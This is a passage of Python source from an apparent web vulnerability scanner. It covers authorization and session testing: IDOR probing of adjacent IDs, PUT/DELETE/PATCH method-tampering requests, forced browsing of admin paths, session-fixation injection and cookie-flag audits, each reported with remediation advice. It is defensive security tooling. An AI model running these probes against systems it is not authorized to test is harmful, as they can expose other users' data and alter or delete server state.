    _LOGIN_PAGE_MARKERS = (
        '<input type="password"', "<input type='password'",
        'name="password"',        "name='password'",
        'id="password"',          "id='password'",
        '<form action="/login',   "action='/login",
        "please log in",          "please sign in",
        "session expired",        "session timeout",
        "you must be logged in",  "you must log in",
        "log in to continue",     "sign in to continue",
    )
    _ERROR_PAGE_MARKERS = (
        "access denied",          "permission denied",
        "you are not authorized", "you are not authorised",
        "you do not have permission",
        "page does not exist",    "page not found",
        "resource not found",     "no such record",
        "unhandled exception",    "an error has occurred",
        "invalid request",        "internal server error",
    )
    _AUTH_PATH_RE = re.compile(
        r'(/login|/signin|/sign-in|/auth/login|/oauth|/sso/|/sign-on)',
        re.IGNORECASE,
    )

    def _is_login_or_error_page(_resp) -> "tuple[bool, str]":
        """True if response body / final URL looks like login / error."""
        try:
            _final_url = (_resp.url or "").lower()
            _body = (_resp.text or "")[:8000].lower()
        except Exception:
            return (False, "")
        if _AUTH_PATH_RE.search(_final_url):
            return (True, f"final URL matched auth path: {_resp.url}")
        for _m in _LOGIN_PAGE_MARKERS:
            if _m in _body:
                return (True, f"login-page marker: {_m!r}")
        for _m in _ERROR_PAGE_MARKERS:
            if _m in _body:
                return (True, f"error-page marker: {_m!r}")
        return (False, "")

    def _validate_idor(_r_test, _r_baseline, _r_anon) -> "tuple[bool, str]":
        """Return (is_real_bypass, reason)."""
        if _r_test.status_code != 200:
            return (False, f"test URL returned HTTP {_r_test.status_code}, not 200")
        if len((_r_test.text or "")) < 100:
            return (False, "test response body <100 bytes (likely empty / minimal)")
        _is_le, _why = _is_login_or_error_page(_r_test)
        if _is_le:
            return (False, _why)
        # If the test response is byte-identical to the baseline, the
        # server is serving the SAME page for every ID — wildcard / catch-
        # all; not an authorisation bypass.
        if _r_baseline is not None:
            try:
                _bl_body = _r_baseline.text or ""
                _tb_body = _r_test.text or ""
                if _bl_body and _tb_body and _bl_body == _tb_body:
                    return (False,
                            "test response body identical to baseline "
                            "(server returns the same page for every ID)")
            except Exception:
                pass
        # If anonymous fetch returns the same response, the URL is public.
        if _r_anon is not None:
            try:
                if _r_anon.status_code == 200 and (_r_anon.text or "") == (_r_test.text or ""):
                    return (False,
                            "anonymous fetch returns identical response — "
                            "URL is publicly accessible, no auth bypass")
            except Exception:
                pass
        return (True, "200 + non-login/error body + differs from baseline + auth required")

    # An unauthenticated session for the public-accessibility check.
    _anon_sess = _make_session(cfg)

    for idx, res in enumerate(resource_ids[:50]):
        res_url = res["url"]
        res_id  = res["id"]
        vc.status(phase, "Authorization Testing", "running", f"ID {res_id}", idx, len(resource_ids))

        # Baseline: fetch the original ID once with auth so the validator
        # can compare against the server's "legit response" template.
        try:
            r_baseline = auth_sess.get(res_url, timeout=timeout)
        except Exception:
            r_baseline = None

        # Test adjacent IDs
        for test_id in [res_id - 1, res_id + 1, res_id + 100]:
            if test_id <= 0:
                continue
            test_url = re.sub(r'/' + str(res_id) + r'(?=/|$|[?#])',
                               '/' + str(test_id), res_url, count=1)
            try:
                r = auth_sess.get(test_url, timeout=timeout)
                # Anonymous control: does the same URL respond identically
                # without any auth cookie? Skip if it does.
                try:
                    r_anon = _anon_sess.get(test_url, timeout=timeout)
                except Exception:
                    r_anon = None
                _is_bypass, _why = _validate_idor(r, r_baseline, r_anon)
                if not _is_bypass:
                    vc.log(
                        f"[authorization] IDOR candidate rejected at "
                        f"{test_url}: {_why}",
                        "INFO",
                    )
                    continue
                # Save evidence: baseline req+resp, test req+resp, anon
                # req+resp. Pack as JSON-array for Crucible's multi-tab.
                _evidence_entries: list = []
                if r_baseline is not None:
                    _bl_rq, _bl_rp = _save_http_evidence(
                        out, phase, f"idor_baseline_{res_id}", r_baseline)
                    _evidence_entries.append({
                        "url": f"BASELINE {res_url}",
                        "req": str(_bl_rq), "resp": str(_bl_rp),
                    })
                _t_rq, _t_rp = _save_http_evidence(
                    out, phase, f"idor_test_{res_id}_to_{test_id}", r)
                _evidence_entries.append({
                    "url": f"IDOR-TEST {test_url}",
                    "req": str(_t_rq), "resp": str(_t_rp),
                })
                if r_anon is not None:
                    _an_rq, _an_rp = _save_http_evidence(
                        out, phase, f"idor_anon_{res_id}_to_{test_id}", r_anon)
                    _evidence_entries.append({
                        "url": f"ANONYMOUS {test_url}",
                        "req": str(_an_rq), "resp": str(_an_rp),
                    })
                out.add_finding(
                    title="Broken Object Level Authorization (IDOR / BOLA)",
                    url=test_url, port=target["port"], risk="CRITICAL",
                    description=(
                        "The application exposes a user-controlled object "
                        "identifier and does not verify whether the "
                        "authenticated user is authorised to access the "
                        "referenced object. Substituting an adjacent ID "
                        "into the URL returned a substantive 200 response "
                        "that is not a login page, not a generic error, "
                        "differs from the baseline (this user's own "
                        "object), and requires authentication (anonymous "
                        "access does not return the same content). "
                        "This pattern enables horizontal privilege "
                        "escalation — any authenticated user can iterate "
                        "the ID space to enumerate other users' data."
                    ),
                    output=(
                        f"Baseline:       {res_url}\n"
                        f"Manipulated:    {test_url}\n"
                        f"Status:         {r.status_code} ({len(r.text or '')} bytes)\n"
                        f"Baseline bytes: {len(r_baseline.text or '') if r_baseline is not None else '(no baseline)'}\n"
                        f"Anon test:      "
                        + (f"{r_anon.status_code} ({len(r_anon.text or '')} bytes)"
                           if r_anon is not None else "(no anon probe)")
                        + f"\nValidator verdict: {_why}"
                    ),
                    sources="fracture-authorization", service=target["scheme"],
                    output_file=json.dumps(_evidence_entries),
                    affected=test_url,
                    owasp="A01:2025 Broken Access Control", nist="AC-3",
                    remediation=(
                        "Enforce server-side authorisation checks for every "
                        "object access request, verifying ownership or "
                        "explicit permission before returning or modifying "
                        "data; do not rely on obscure or sequential IDs as "
                        "an access control mechanism."
                    ),
                    http_code=r.status_code,
                )
                vc.log(f"[authorization] IDOR confirmed: {test_url}", "SUCCESS")
                break
            except Exception:
                pass

    vc.status(phase, "Authorization Testing", "running", "HTTP method tampering", len(resource_ids), len(resource_ids))
    # Method tampering
    # SPA FP guard: React/Angular/Vue SPAs return the same index.html shell for
    # any HTTP method on client-side routes.  A PUT/DELETE/PATCH returning 200 is
    # the web server serving the SPA shell — not the endpoint accepting the method.
    # Detect by comparing the non-GET response to a baseline GET of the same URL.
    _MT_SPA_RE = re.compile(
        r'<div\s+id=["\'](?:root|app|__next|__nuxt|js-[a-z]+-app|main|container|application)["\']|'
        r'<script[^>]+(?:bundle|chunk|main|app|client)\.[a-f0-9]+\.js|'
        r'__NEXT_DATA__|window\.__INITIAL_STATE__|'
        r'window\.__NUXT__|ReactDOM\b|ng-app=|ng-version=',
        re.IGNORECASE,
    )
    auth_links = auth_recon_data.get("links", [])
    for link in auth_links[:20]:
        # Baseline GET for SPA FP comparison (once per link) —
        # use MD5 hash (not body length) to detect identical SPA shells
        _mt_base_hash = None
        _mt_base_len  = -1
        _mt_is_spa    = False
        try:
            _mt_base_r = auth_sess.get(link, timeout=timeout)
            _mt_base_body = _mt_base_r.text or ""
            _mt_base_len  = len(_mt_base_body)
            _mt_base_hash = hashlib.md5(_mt_base_body.encode("utf-8", "replace")).hexdigest()
            _mt_is_spa = bool(_MT_SPA_RE.search(_mt_base_body[:16384]))
        except Exception:
            pass
        for method in ("PUT", "DELETE", "PATCH"):
            try:
                r = auth_sess.request(method, link, timeout=timeout)
                if r.status_code not in (405, 404, 400, 401, 403, 500, 501, 502, 503):
                    # SPA FP guard: if the response body is identical to the
                    # GET baseline (by MD5), the server is just serving the
                    # same page regardless of method — not actually accepting
                    # the method. Also catches non-SPA catchall routers.
                    _mt_resp_body = r.text or ""
                    _mt_resp_hash = hashlib.md5(_mt_resp_body.encode("utf-8", "replace")).hexdigest()
                    if _mt_base_hash and _mt_resp_hash == _mt_base_hash:
                        vc.log(
                            f"[authorization] Skipping method tampering FP: "
                            f"{method} {link} — response identical to GET "
                            f"baseline (hash={_mt_base_hash[:8]}…)", "INFO")
                        continue
                    # Secondary check: SPA regex match + size within 200B
                    if (_mt_is_spa and _mt_base_len > 0
                            and abs(len(_mt_resp_body) - _mt_base_len) < 200):
                        vc.log(
                            f"[authorization] Skipping method tampering FP: "
                            f"{method} {link} — SPA shell ~same size as GET", "INFO")
                        continue
                    # ── Functional validation ──
                    # Confirm the method actually changed state before
                    # reporting a MEDIUM finding.
                    _mt_functional, _mt_val_ev = _validate_method_functional(
                        method, link, r, auth_sess, timeout,
                        _mt_base_hash, _mt_base_body)
                    if _mt_functional:
                        _mt_risk  = "MEDIUM"
                        _mt_title = f"HTTP Method Tampering: {method} Accepted"
                        _mt_desc  = (
                            f"The endpoint {link} accepted HTTP {method} "
                            f"(status {r.status_code}) and the method was "
                            f"confirmed to be functional — server state changed.")
                    else:
                        _mt_risk  = "INFO"
                        _mt_title = f"HTTP Method Accepted But Not Functional: {method}"
                        _mt_desc  = (
                            f"The endpoint {link} responded to HTTP {method} "
                            f"with status {r.status_code}, but validation "
                            f"confirms the method did not alter server state. "
                            f"The server accepts the method but ignores it.")
                    # Capture evidence for the accepted method
                    _mt_ev_path = ""
                    try:
                        _mt_safe = re.sub(r'[^a-zA-Z0-9_.-]', '_', link)[:80]
                        _mt_ev_name = f"method_tamper_{method}_{_mt_safe}"
                        _mt_ev_file = out.output_path(phase, _mt_ev_name)
                        _mt_ev_lines = [
                            f"HTTP Method Tampering Evidence",
                            f"{'='*50}",
                            f"Request:  {method} {link}",
                            f"Response: {r.status_code} {r.reason}",
                            f"",
                            f"Response Headers:",
                        ]
                        for _hk, _hv in r.headers.items():
                            _mt_ev_lines.append(f"  {_hk}: {_hv}")
                        _mt_ev_lines.append("")
                        _mt_ev_lines.append("Response Body (first 2000 chars):")
                        _mt_ev_lines.append(_mt_resp_body[:2000])
                        if _mt_val_ev:
                            _mt_ev_lines.append("")
                            _mt_ev_lines.append("Validation Steps:")
                            _mt_ev_lines.extend(f"  {v}" for v in _mt_val_ev)
                        _mt_ev_file.write_text(
                            "\n".join(_mt_ev_lines), encoding="utf-8")
                        _mt_ev_path = str(_mt_ev_file)
                    except Exception:
                        pass
                    _mt_output_lines = [
                        f"{method} {link} → {r.status_code}",
                        "",
                        "Response headers:",
                    ] + [f"  {k}: {v}" for k, v in list(r.headers.items())[:10]]
                    if _mt_val_ev:
                        _mt_output_lines.append("")
                        _mt_output_lines.append("Validation:")
                        _mt_output_lines.extend(f"  {v}" for v in _mt_val_ev)
                    out.add_finding(
                        title=_mt_title,
                        url=link, port=target["port"], risk=_mt_risk,
                        description=_mt_desc,
                        output="\n".join(_mt_output_lines),
                        sources="fracture-authorization", service=target["scheme"],
                        output_file=_mt_ev_path,
                        affected=link,
                        owasp="A01:2025 Broken Access Control", nist="AC-3",
                        remediation="Restrict HTTP methods to only those required for each endpoint.",
                        http_code=r.status_code,
                    )
                    vc.log(
                        f"[authorization] Method tampering {method} on {link} "
                        f"({'functional' if _mt_functional else 'accepted but not functional'})",
                        "SUCCESS" if _mt_functional else "INFO")
            except Exception:
                pass

    # ── Forced browsing / authorization gaps (#3 FR-457) ───────────────────────
    _ADMIN_PATHS = (
        "/admin", "/admin/", "/administrator", "/dashboard", "/manage",
        "/settings", "/config", "/configuration", "/panel", "/control",
        "/console", "/manager", "/management", "/cms", "/cpanel",
        "/webadmin", "/sysadmin", "/maintenance", "/setup", "/install",
        "/api/admin", "/api/config", "/api/settings", "/api/users",
        "/api/management", "/api/system", "/internal", "/debug",
        "/server-status", "/server-info", "/_admin", "/wp-admin",
        "/phpmyadmin", "/adminer",
    )
    _fb_found: list = []
    _unauth_fb = _make_session(cfg)
    for _fb_path in _ADMIN_PATHS:
        try:
            _fb_url = url.rstrip("/") + _fb_path
            _fb_r = _unauth_fb.get(_fb_url, timeout=min(timeout, 8), allow_redirects=True)
            if _fb_r.status_code in (200, 201):
                _fb_body = _fb_r.text or ""
                if len(_fb_body) < 100:
                    continue
                # Check if this is a soft error / login page (200-always)
                if _is_soft_error_page(_fb_body):
                    continue
                _fb_is_le, _ = _is_login_or_error_page(_fb_r)
                if _fb_is_le:
                    continue
                if _matches_error_fingerprint(_fb_body):
                    continue
                if _response_is_error_page(_fb_body):
                    continue
                # Confirmed: real content accessible unauthenticated
                _fb_ev: list = []
                try:
                    _rq, _rp = _save_http_evidence(
                        out, phase, f"forced_browse_{_fb_path.strip('/').replace('/', '_')}",
                        _fb_r, endpoint_url=_fb_url, method="GET")
                    _fb_ev.extend([str(_rq), str(_rp)])
                except Exception:
                    pass
                _fb_found.append({
                    "url": _fb_url, "path": _fb_path,
                    "status": _fb_r.status_code,
                    "evidence": _fb_ev,
                    "title_snip": re.search(r'<title>([^<]{0,80})</title>',
                                            _fb_body[:4000], re.I),
                })
        except Exception:
            pass
    if _fb_found:
        _fb_output = "\n".join(
            f"  {f['path']}  → HTTP {f['status']}"
            + (f"  title=\"{f['title_snip'].group(1)}\""
               if f['title_snip'] else "")
            for f in _fb_found
        )
        _fb_all_ev: list = []
        for f in _fb_found:
            _fb_all_ev.extend(f["evidence"])
        out.add_finding(
            title="Authorization Gaps — Unauthenticated Access to Restricted Paths",
            url=_fb_found[0]["url"], port=target["port"], risk="HIGH",
            description=(
                f"{len(_fb_found)} administrative or restricted path(s) are "
                f"accessible without authentication. This indicates missing "
                f"or misconfigured access controls that could allow unauthorized "
                f"access to sensitive functionality or data."
            ),
            output=f"Accessible restricted paths ({len(_fb_found)}):\n{_fb_output}",
            output_file=",".join(_fb_all_ev) if _fb_all_ev else "",
            sources="fracture-authorization", service=target["scheme"],
            affected="\n".join(f["url"] for f in _fb_found),
            owasp="A01:2025 Broken Access Control",
            nist="AC-3",
            remediation=(
                "Implement proper access controls on all administrative and "
                "restricted paths. Deny access by default and require "
                "authentication and appropriate authorization for all "
                "sensitive endpoints."
            ),
            http_code=_fb_found[0]["status"],
        )
        vc.log(f"[authorization] Forced browsing: {len(_fb_found)} path(s) accessible", "SUCCESS")

    vc.status(phase, "Authorization Testing", "complete", "Done", len(resource_ids), len(resource_ids))
    vc.log("[authorization] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 13: Session
# ─────────────────────────────────────────────
def _phase_session(target: dict, cfg: dict, pm: ProgressManager,
                   out: OutputManager, auth_sess: requests.Session) -> None:
    phase    = "session"
    url      = target["url"]
    hostname = target["hostname"]
    timeout  = cfg.get("timeout", 10)
    vc.status(phase, "Session Analysis", "running", "Token entropy", 0, 13)
    _SESS_LOGIN_RE = re.compile(
        r'login|sign.?in|auth(?:enticate)?|session.?expired|timed.?out|'
        r'please.{0,20}log.{0,10}in', re.I
    )

    # 1. Analyse session token entropy
    # Non-session cookies that should never trigger entropy/predictability
    # findings: redirect/navigation cookies whose values are URL paths,
    # tracking/analytics cookies, and infrastructure cookies.
    _ENTROPY_SKIP_NAME_RE = re.compile(
        r'(?i)^(login[-_]?redirect|return[-_]?(?:url|to)|next|redirect|'
        r'back[-_]?url|goto|continue|referer|origin[-_]?url|'
        r'_pk_|_ga|_gid|_gat|__utm|_fbp|_gcl|__hstc|__hssc|hubspot)')
    for cookie in auth_sess.cookies:
        val = cookie.value or ""
        if len(val) < 8:
            continue
        # Skip infrastructure and non-session cookies
        if _INFRA_COOKIE_RE.match(cookie.name):
            continue
        if _ENTROPY_SKIP_NAME_RE.match(cookie.name):
            continue
        # Skip cookies whose value is a URL path or URL (redirect cookies)
        try:
            _decoded_val = urllib.parse.unquote(val)
            if _decoded_val.startswith("/") or _decoded_val.startswith("http"):
                continue
        except Exception:
            pass
        # Check for low-entropy tokens
        unique_chars = len(set(val))
        if unique_chars < 8 and len(val) < 20:
            _le_ev = ""
            try:
                _le_path = out.output_path(phase, f"low_entropy_{cookie.name}")
                _le_path.write_text(
                    f"Session Token Entropy Analysis\n"
                    f"Cookie: {cookie.name}\n"
                    f"Value length: {len(val)}\n"
                    f"Unique characters: {unique_chars}\n"
                    f"Value (truncated): {val[:40]}...\n",
                    encoding="utf-8")
                _le_ev = str(_le_path)
            except Exception:
                pass
            out.add_finding(
                title="Low-Entropy Session Token",
                url=url, port=target["port"], risk="HIGH",
                description=f"Session cookie '{cookie.name}' has low entropy (value length={len(val)}, unique chars={unique_chars}).",
                output=f"Cookie: {cookie.name}={val[:20]}...",
                sources="fracture-session", service=target["scheme"],
                output_file=_le_ev,
                owasp="A07:2025 Identification and Authentication Failures",
                nist="IA-5",
                remediation="Use cryptographically secure random session token generators (e.g. 128-bit+).",
            )

        # Check for sequential/predictable tokens
        if val.isdigit():
            _pred_ev = ""
            try:
                _pred_path = out.output_path(phase, f"predictable_{cookie.name}")
                _pred_path.write_text(
                    f"Predictable Session Token Analysis\n"
                    f"Cookie: {cookie.name}\n"
                    f"Value: {val[:40]}\n"
                    f"Pattern: all-numeric (possible sequential ID)\n",
                    encoding="utf-8")
                _pred_ev = str(_pred_path)
            except Exception:
                pass
            out.add_finding(
                title="Potentially Predictable Session Token",
                url=url, port=target["port"], risk="HIGH",
                description=f"Session cookie '{cookie.name}' consists entirely of digits, which may indicate a sequential or predictable value.",
                output=f"Cookie: {cookie.name}={val[:20]}",
                sources="fracture-session", service=target["scheme"],
                output_file=_pred_ev,
                owasp="A07:2025 Identification and Authentication Failures",
                nist="IA-5",
                remediation="Use cryptographically secure random session identifiers.",
            )

    vc.status(phase, "Session Analysis", "running", "Session fixation", 1, 13)
    # 2. Session fixation — OWASP WSTG-SESS-03
    #    Test whether the server regenerates the session ID upon login.
    #    Methodology:
    #      a) Find the session cookie name from the authenticated session.
    #      b) Create a fresh session, inject a fixed ID, GET the login page.
    #      c) Authenticate through that SAME session via _build_auth_session(session=...).
    #      d) Check if the post-auth session cookie still holds the fixed ID.
    #      e) If it does, verify the session is actually authenticated (not
    #         just a stale cookie in the jar that the server ignores).
    fixed_id = "fracture_fixed_session_12345678"
    try:
        session_cookie_name = None
        for cookie in auth_sess.cookies:
            if re.search(r'sess|token|auth|sid', cookie.name, re.I):
                session_cookie_name = cookie.name
                break
        if session_cookie_name and cfg.get("auth", {}).get("enabled"):
            # Step 1: pre-auth — inject the fixed session ID
            fix_sess = _make_session(cfg)
            fix_sess.cookies.set(session_cookie_name, fixed_id)
            login_url = cfg.get("auth", {}).get("login_url", url)
            _pre_r = fix_sess.get(login_url, timeout=timeout)
            _pre_val = ""
            for _ck in fix_sess.cookies:
                if _ck.name == session_cookie_name:
                    _pre_val = _ck.value
                    break

            if _pre_val == fixed_id:
                # Server accepted the fixed ID pre-auth.  Now authenticate
                # through this same session so the cookie survives the flow.
                vc.log(f"[session] Server accepted fixed session ID pre-auth "
                       f"({session_cookie_name}={fixed_id[:20]}…) — testing "
                       f"post-auth persistence", "INFO")

                import copy as _sf_copy
                _sf_cfg = _sf_copy.deepcopy(cfg)
                # Pass fix_sess so _build_auth_session uses it (no new
                # session creation) — the fixed cookie rides through login.
                _sf_sess = _build_auth_session(
                    _sf_cfg, no_interactive=True,
                    role_label="fixation-test",
                    session=fix_sess)

                if _sf_sess is not None:
                    # Collect ALL values for the target cookie — the jar
                    # may hold both the old injected value AND a server-
                    # regenerated one (different domain/path attrs).  If
                    # any value differs from fixed_id, the server DID
                    # regenerate regardless of jar ordering.
                    _post_vals = set()
                    for _ck in _sf_sess.cookies:
                        if _ck.name == session_cookie_name:
                            _post_vals.add(_ck.value)
                    _post_val = next(iter(_post_vals), "")
                    # If the jar holds ANY value besides fixed_id, the
                    # server regenerated — not vulnerable.
                    _jar_regenerated = (_post_vals and _post_vals != {fixed_id})
                    if _jar_regenerated:
                        vc.log(f"[session] Session ID regenerated after auth "
                               f"(jar contains {len(_post_vals)} distinct values "
                               f"for '{session_cookie_name}') — not vulnerable",
                               "INFO")
                    # Also check Set-Cookie headers from the auth response
                    # for regeneration evidence — the server may have sent
                    # a new value even if the cookie jar retained the old one
                    # (e.g. duplicate cookies, Okta-style indirect auth flows).
                    _regenerated_via_setcookie = False
                    if not _jar_regenerated:
                        if hasattr(_sf_sess, '_fracture_last_response'):
                            _sc_resp = _sf_sess._fracture_last_response
                        else:
                            _sc_resp = None
                        if _sc_resp is not None:
                            for _sc_hdr in _sc_resp.headers.getlist(
                                    "Set-Cookie") if hasattr(
                                    _sc_resp.headers, "getlist") else (
                                    _sc_resp.headers.get("Set-Cookie", ""),):
                                if (session_cookie_name + "=" in _sc_hdr
                                        and fixed_id not in _sc_hdr):
                                    _regenerated_via_setcookie = True
                                    break

                    if (fixed_id in _post_vals
                            and not _jar_regenerated
                            and not _regenerated_via_setcookie):
                        # Cookie still holds the fixed value and no Set-Cookie
                        # with a regenerated value was observed.  Verify the
                        # session is actually authenticated — a stale cookie
                        # in the jar that the server ignores is NOT fixation.
                        # SPA-aware: also check if the response is just the
                        # SPA shell (identical to an unauth request), which
                        # does NOT prove the session is authed.
                        _verify_r = _sf_sess.get(url, timeout=timeout)
                        _spa_shell = False
                        try:
                            _unauth_chk = _make_session(cfg)
                            _unauth_r = _unauth_chk.get(url, timeout=timeout)
                            if (_unauth_r and _unauth_r.status_code == 200
                                    and _verify_r and _verify_r.status_code == 200):
                                if (_p20_body_hash((_verify_r.text or "").strip())
                                        == _p20_body_hash(
                                            (_unauth_r.text or "").strip())):
                                    _spa_shell = True
                        except Exception:
                            pass
                        if (_verify_r
                                and not _spa_shell
                                and not _inj_is_login_page(_verify_r)
                                and not _matches_error_fingerprint(
                                    _verify_r.text)):
                            _ev_pairs = ""
                            try:
                                _sf_rq, _sf_rp = _save_http_evidence(
                                    out, phase,
                                    f"session_fixation_{hostname}", _verify_r)
                                _ev_pairs = json.dumps([{
                                    "url": f"SESSION FIXATION  "
                                           f"GET {url} (HTTP {_verify_r.status_code})",
                                    "req":  str(_sf_rq),
                                    "resp": str(_sf_rp),
                                }])
                            except Exception:
                                pass
                            out.add_finding(
                                title="Session Fixation Vulnerability",
                                url=url, port=target["port"], risk="HIGH",
                                description=(
                                    f"The session cookie '{session_cookie_name}' is not "
                                    f"regenerated upon authentication.  An attacker-controlled "
                                    f"session ID ('{fixed_id}') was injected pre-auth, and the "
                                    f"server retained it through a full authentication cycle.  "
                                    f"The post-auth session was verified as authenticated "
                                    f"(not a stale/ignored cookie).  This allows an attacker "
                                    f"who can set the victim's cookie (via XSS, sub-domain "
                                    f"cookie, or network injection) to hijack the session "
                                    f"after the victim logs in."),
                                output=(
                                    f"Cookie:           {session_cookie_name}\n"
                                    f"Injected (fixed): {fixed_id}\n"
                                    f"Post-auth value:  {_post_val}\n"
                                    f"Regenerated:      No — VULNERABLE\n"
                                    f"Auth verified:    Yes (page is not a login redirect)"),
                                output_file=_ev_pairs,
                                sources="fracture-session", service=target["scheme"],
                                owasp="A07:2025 Identification and Authentication Failures",
                                nist="IA-5",
                                remediation=(
                                    "Regenerate session IDs upon every authentication "
                                    "state change (login, logout, privilege escalation).  "
                                    "Reject externally provided session IDs or bind them "
                                    "to a server-generated token."),
                                http_code=_verify_r.status_code,
                            )
                            vc.log("[session] Session fixation CONFIRMED — fixed ID "
                                   "survived authentication AND session is authed",
                                   "SUCCESS")
                        else:
                            if _spa_shell:
                                vc.log("[session] Fixed session ID in cookie jar but "
                                       "response is the SPA shell (same body as unauth) "
                                       "— cannot confirm auth, not vulnerable", "INFO")
                            else:
                                vc.log("[session] Fixed session ID in cookie jar but "
                                       "server is not using it (response is a login "
                                       "page) — not vulnerable (stale cookie)", "INFO")
                    else:
                        if _regenerated_via_setcookie:
                            vc.log(f"[session] Set-Cookie header regenerated "
                                   f"'{session_cookie_name}' during auth "
                                   f"(fixed ID replaced) — not vulnerable "
                                   f"(regeneration via Set-Cookie)", "INFO")
                        else:
                            vc.log(f"[session] Session ID regenerated after auth "
                                   f"({_post_val[:20]}… ≠ {fixed_id[:20]}…) — "
                                   f"not vulnerable", "INFO")
                else:
                    vc.log("[session] Could not authenticate for fixation "
                           "verification — skipping", "INFO")
            else:
                vc.log("[session] Server rejected fixed session ID pre-auth "
                       "— not vulnerable", "INFO")
        elif not session_cookie_name:
            vc.log("[session] No session cookie found — skipping fixation test",
                   "INFO")
        else:
            vc.log("[session] Auth not enabled — skipping fixation verification",
                   "INFO")
    except Exception as _fix_e:
        vc.log(f"[session] Fixation test error: {_fix_e}", "WARNING")

    vc.status(phase, "Session Analysis", "running", "Session management UI", 2, 13)
    # 3. Active session management UI detection (OWASP WSTG-SESS-06)
    # Probe common paths where apps expose an interface to view/close active sessions.
    _SESS_MGMT_PATHS = (
        "/sessions", "/active-sessions", "/account/sessions", "/user/sessions",
        "/settings/security", "/security/sessions", "/account/security",
        "/profile/sessions", "/me/sessions", "/api/sessions",
        "/api/active-sessions", "/api/v1/sessions",
    )
    _sess_mgmt_found = None
    # Baseline content for SPA / catch-all detection: if every sub-path
    # serves the same shell HTML (React SPA, generic error page, etc.),
    # a 200 does not mean a real session-management interface exists.
    # Use both the origin and the app-root for probing — session management
    # interfaces can live at either level.
    _sm_origin = f"{target['scheme']}://{hostname}"
    if target["port"] not in (80, 443):
        _sm_origin += f":{target['port']}"
    # Derive app root from target URL path: /OMT/Client/Login/ → /OMT/
    _sm_parsed = urllib.parse.urlparse(url)
    _sm_segs = [s for s in _sm_parsed.path.split("/") if s]
    _sm_app_root = f"/{_sm_segs[0]}" if _sm_segs else ""
    _sm_bases = [_sm_origin]
    if _sm_app_root:
        _sm_bases.append(_sm_origin + _sm_app_root)
    _sm_baseline_body = ""
    _sm_baseline_len  = 0
    try:
        _bl = auth_sess.get(url.rstrip("/"), timeout=timeout, allow_redirects=True)
        if _bl.status_code == 200:
            _sm_baseline_body = _bl.text[:2000]
            _sm_baseline_len  = len(_bl.text)
    except Exception:
        pass
    _SM_ERROR_RE = re.compile(
        r'(?:critical|internal|server|application|unexpected)\s+error'
        r'|error\s*(?:page|occurred|has\s+occurred)'
        r'|(?:404|not\s+found|does\s+not\s+exist)'
        r'|exception\b.*(?:stack\s*trace|at\s+System\.|at\s+java\.)'
        r'|ErrorPage\.aspx'
        r'|was\s+not\s+found\s+on\s+controller',
        re.I | re.S)
    _sm_probed: set = set()
    for _sm_base in _sm_bases:
        if _sess_mgmt_found:
            break
        for _smp in _SESS_MGMT_PATHS:
            _sm_probe_url = _sm_base.rstrip("/") + _smp
            if _sm_probe_url in _sm_probed:
                continue
            _sm_probed.add(_sm_probe_url)
            try:
                _r_sm = auth_sess.get(_sm_probe_url, timeout=timeout,
                                      allow_redirects=True)
                if (_r_sm.status_code == 200
                        and not _SESS_LOGIN_RE.search(_r_sm.text[:600])):
                    # SPA / catch-all detection: if the response body closely
                    # matches the base URL, this is a single-page app serving
                    # the same shell for any path — not a real endpoint.
                    if (_sm_baseline_len > 0
                            and abs(len(_r_sm.text) - _sm_baseline_len) < max(100, int(_sm_baseline_len * 0.05))
                            and _r_sm.text[:500] == _sm_baseline_body[:500]):
                        continue
                    # Error page detection: MVC/ASP.NET/Java frameworks
                    # sometimes return 200 with an error page body when the
                    # route doesn't exist.
                    if _SM_ERROR_RE.search(_r_sm.text[:4000]):
                        continue
                    _sess_mgmt_found = _sm_probe_url
                    break
            except Exception:
                pass

    if _sess_mgmt_found:
        # Save the discovered session-management page as req/resp evidence.
        # _r_sm is the 200-response that confirmed the endpoint exists.
        _sm_evidence = ""
        try:
            _sm_rq, _sm_rp = _save_http_evidence(
                out, phase, f"session_mgmt_{hostname}", _r_sm)
            _sm_evidence = json.dumps([{
                "url":  f"SESSION MGMT  GET {_sess_mgmt_found} (HTTP {_r_sm.status_code})",
                "req":  str(_sm_rq),
                "resp": str(_sm_rp),
            }])
        except Exception:
            pass
        out.add_finding(
            title="Active Session Management Interface Detected",
            url=_sess_mgmt_found, port=target["port"], risk="INFO",
            description=(
                f"An active session management endpoint was found at "
                f"{_sess_mgmt_found}. This interface may allow users to view "
                f"and revoke other sessions — verify it is properly "
                f"access-controlled and cannot be abused to terminate other "
                f"users' sessions. The captured page HTML is in the Evidence "
                f"panel."
            ),
            output=(
                f"Session management URL: {_sess_mgmt_found}\n"
                f"HTTP status:            {_r_sm.status_code}\n"
                f"Body size:              {len(_r_sm.text or '')} bytes"
            ),
            output_file=_sm_evidence,
            sources="fracture-session", service=target["scheme"],
            owasp="A07:2025 Identification and Authentication Failures",
            nist="AC-17",
            remediation=(
                "Ensure the session management interface enforces authorisation — "
                "users must only be able to view and revoke their own sessions. "
                "Log all session revocation events."
            ),
        )
        vc.log(f"[session] Active session management UI: {_sess_mgmt_found}", "SUCCESS")
    else:
        vc.log("[session] No active session management interface found at common paths", "INFO")

    vc.status(phase, "Session Analysis", "running", "Cookie security flags", 3, 13)
    # 4. Cookie security flag audit
    # Collect all cookies missing Secure, HttpOnly, or SameSite.
    # Groups by flag type to produce one finding per issue, not per cookie,
    # so the report is clean even on apps that set many cookies.
    _miss_secure:   list = []
    _miss_httponly: list = []
    _miss_samesite: list = []
    _bad_samesite_none: list = []

    for _ck in auth_sess.cookies:
        # Skip infrastructure cookies (load balancer, CDN, WAF persistence) —
        # these are NOT session cookies and missing flags on them is not a
        # session-hijack vector.
        if _INFRA_COOKIE_RE.match(_ck.name):
            continue
        # Skip analytics, tracking, and redirect cookies — missing flags
        # on these are not session-hijack vectors.
        if _TRACKING_COOKIE_RE.match(_ck.name):
            continue

        # Secure flag (standard http.cookiejar attribute)
        if not _ck.secure:
            _miss_secure.append(_ck.name)

        # HttpOnly flag (non-standard, stored in _rest by requests)
        _httponly = False
        try:
            _httponly = _ck.has_nonstandard_attr("HttpOnly")
        except Exception:
            try:
                _httponly = "HttpOnly" in (_ck._rest or {})
            except Exception:
                pass
        if not _httponly:
            _miss_httponly.append(_ck.name)

        # SameSite attribute
        _samesite = ""
        try:
            _samesite = ((_ck._rest or {}).get("SameSite") or "").strip()
        except Exception:
            pass
        if not _samesite:
            _miss_samesite.append(_ck.name)
        elif _samesite.lower() == "none" and not _ck.secure:
            # SameSite=None requires Secure; without it modern browsers reject
